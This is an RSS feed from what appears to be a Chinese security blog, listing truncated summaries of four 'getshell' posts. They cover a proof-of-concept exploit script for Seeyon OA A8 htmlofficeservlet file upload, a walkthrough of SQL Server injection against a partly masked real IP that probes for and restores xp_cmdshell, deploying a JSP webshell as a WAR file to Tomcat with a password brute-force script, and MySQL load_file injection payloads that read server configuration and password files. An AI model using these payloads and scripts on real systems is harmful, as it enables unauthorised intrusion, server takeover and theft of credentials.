<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>getshell on </title>
    <link>https://wyb0.com/tags/getshell/</link>
    <description>Recent content in getshell on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 29 Jun 2019 17:57:32 +0800</lastBuildDate>
    
	<atom:link href="https://wyb0.com/tags/getshell/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</title>
      <link>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</link>
      <pubDate>Sat, 29 Jun 2019 17:57:32 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</guid>
      <description>0x00 影响版本  致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件 V7.1  0x01 查看接口看是否存在漏洞 如果查看 &amp;quot;seeyon/htmlofficeservlet&amp;quot; 接口，出现如下内容则表示存在漏洞 0x02 POC &amp;amp; EXP #!/usr/bin/env python # -*- coding: utf-8 -*- import time import random import string import requests info = { &amp;quot;name&amp;quot;: &amp;quot;致远 A8 可 getshell&amp;quot;, &amp;quot;author&amp;quot;: &amp;quot;reber&amp;quot;, &amp;quot;version&amp;quot;: &amp;quot;致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;file_upload&amp;quot;, &amp;quot;level&amp;quot;: &amp;quot;high&amp;quot;, &amp;quot;result&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;status&amp;quot;: False, &amp;quot;references&amp;quot;: &amp;quot;&amp;lt;url&amp;gt;&amp;quot;, &amp;quot;desc&amp;quot;: &amp;quot;&amp;lt;vul describtion&amp;gt;&amp;quot;, } def assign(service, arg): if service == &#39;seeyon&#39;: return True, arg def encode(origin_bytes): &amp;quot;&amp;quot;&amp;quot; 重构 base64 编码函数 &amp;quot;&amp;quot;&amp;quot; # 将每一位bytes转换为二进制字符串 base64_charset = &amp;quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&amp;quot; base64_bytes = [&#39;{:0&amp;gt;8}&#39;.</description>
    </item>
    
    <item>
      <title>从 SQL Server 注入到 getshell</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link>
      <pubDate>Sat, 02 Mar 2019 20:23:35 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid>
      <description>0x00 目标情况  一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的信息  0x01 发现注入 当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用
另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面 但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应
burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通过sqlmap得到了这几个数据库
[*] HSOA_20170320 [*] HSOA_NEW [*] HSOA_T [*] master [*] model [*] msdb [*] Shuttle [*] SHWT [*] tempdb  0x02 找网站绝对路径  判断是不是dba权限(延时后返回正确页面，确定为dba权限&amp;lt;也可用sqlmap的&amp;ndash;is-dba判断&amp;gt;)  uname=test&#39;;if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;;--   判断是否是站库分离(延时后返回正确页面，确定站库没有分离)  uname=test&#39;;if(host_name()=@@servername) WAITFOR DELAY &#39;0:0:5&#39;;--   查看是否有xp_cmdshell  uname=test&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:2&#39;--  恢复／删除xp_cmdshell exec sp_addextendedproc xp_cmdshell,@dllname=&#39;xplog70.</description>
    </item>
    
    <item>
      <title>Tomcat部署War包getshell</title>
      <link>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</link>
      <pubDate>Tue, 02 Aug 2016 22:30:13 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</guid>
      <description>0x00 关于 War 包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。  0x01 上传 War 包 GetShell  找到后台猜密码然后登录  上传 War 包
  运行 jar -cf job.war ./job.jsp 生成 war 包
或者先将 jsp 大马压缩为 zip，再将 zip 后缀改名为 war ，然后上传 war 包
0x02 漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码 #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &amp;quot;&amp;quot;&amp;quot; 简单爆破后台登陆密码 Usage: python tomcat.</description>
    </item>
    
    <item>
      <title>SQL注入之load_file和into outfile(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
      <description>0x00 load_file() 读文件  条件:  1. 要有file_priv权限: show global variables like &#39;%secure%&#39;; 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
 读/etc/init.d下的东西，这里有配置文件路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)  得到web安装路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)  读取密码文件
?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 load data local infile 读文件  条件:  MySQL8 中需要 SET GLOBAL local_infile=1;   语句  LOAD DATA LOCAL INFILE &#39;D:/pet.txt&#39; INTO TABLE pet FIELDS TERMINATED BY &#39;&#39;; select * from pet;  0x02 into outfile getshell  条件：  1.</description>
    </item>
    
  </channel>
</rss>